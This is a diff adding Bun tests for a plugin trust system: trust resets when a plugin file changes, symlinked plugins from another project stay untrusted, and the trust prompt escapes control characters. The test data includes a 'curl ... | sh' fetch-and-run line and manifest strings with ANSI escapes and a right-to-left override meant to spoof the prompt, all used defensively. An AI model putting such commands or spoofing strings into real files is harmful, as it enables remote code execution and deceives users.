@@ -3,7 +3,7 @@
 // file is a changed hash and resets the trust; the daemon audits a trust once (plugin.trusted); `capcomd plugins trust`
 // is the prompt.
 import { beforeEach, describe, expect, test } from "bun:test";
-import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { PluginHost } from "../../packages/plugin/src/host/host";
@@ -93,11 +93,37 @@ describe("a project's plugin", () => {
     expect(started).toEqual(["pp", "pp"]);
   });
 
+  test("a checkout's LOCK is one of the plugin's files: changing it resets the trust", () => {
+    const p = project();
+    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), entry: { runtime: "process", command: ["sh", "LOCK"] } }));
+    writeFileSync(join(p.plugin, "LOCK"), "exit 0\n");
+    trustPlugin("pp", { project: p.dir });
+    expect(projectPluginTrusted(p.plugin).trusted).toBe(true);
+    writeFileSync(join(p.plugin, "LOCK"), "curl https://example.invalid | sh\n");
+    expect(projectPluginTrusted(p.plugin).trusted).toBe(false);
+    expect(projectPluginList(p.dir)[0]!.trust).toBe("changed");
+  });
+
   test("the same plugin copied to another project isn't trusted there", () => {
     const a = project(), b = project();
     trustPlugin("pp", { project: a.dir });
     expect(projectPluginList(a.dir)[0]!.trust).toBe("trusted");
     expect(projectPluginList(b.dir)[0]!.trust).toBe("untrusted");
+  });
+
+  test("a link to a plugin another project trusted isn't one of this project's plugins (trust is per place)", () => {
+    const a = project(), b = project();
+    trustPlugin("pp", { project: a.dir });
+    rmSync(b.plugin, { recursive: true });
+    symlinkSync(a.plugin, b.plugin);
+    expect(projectPlugins(env(), b.dir)).toEqual([]);
+    expect(projectPluginList(b.dir)).toEqual([]);
+    expect(() => trustPlugin("pp", { project: b.dir })).toThrow(/has no plugin pp/);
+    // The same with the whole folder linked.
+    const c = project();
+    rmSync(join(c.dir, ".capcomd", "plugins"), { recursive: true });
+    symlinkSync(join(a.dir, ".capcomd", "plugins"), join(c.dir, ".capcomd", "plugins"));
+    expect(projectPlugins(env(), c.dir)).toEqual([]);
   });
 
   test("the daemon's host writes plugin.trusted once per trust, when it first runs the plugin under it", async () => {
@@ -172,5 +198,20 @@ describe("capcomd plugins trust (the prompt)", () => {
     const text = await cli(["plugins", "list"], p.dir);
     expect(text.stdout).toMatch(/pp\s+1\.0\.0\s+project\s+validated/);
     expect(text.stdout).not.toContain("not trusted yet");
+  });
+
+  test("the prompt prints the manifest's text inert: no escape sequence or carriage return can redraw what it asks about", async () => {
+    const p = project();
+    const hide = "\u001b[1A\u001b[2K\r";
+    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), description: `harmless${hide}  runs     ./ok.sh`,
+      entry: { runtime: "process", command: ["./run.sh", `x${hide}`, "--flag=1", "a\u202eb"] },
+      config: { type: "object", properties: { token: { type: "object", "x-secret": true, default: { $secret: "env:GITHUB_TOKEN" } } } } }));
+    const asked = await cli(["plugins", "trust", "pp"], p.dir);
+    expect(asked.code).toBe(2);
+    expect(asked.stdout).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f\u202e]/);
+    expect(asked.stdout).toContain("harmless\\u{1b}[1A\\u{1b}[2K\\u{d}  runs");
+    // What it gets of yours at its start: a secret's reference (here the manifest's own default).
+    expect(asked.stdout).toContain("secrets  token ← env:GITHUB_TOKEN");
+    expect(asked.stdout).toContain(`runs     ./run.sh "x\\u001b[1A\\u001b[2K\\r" --flag=1 "a\\u{202e}b"  (on this machine`);
   });
 });
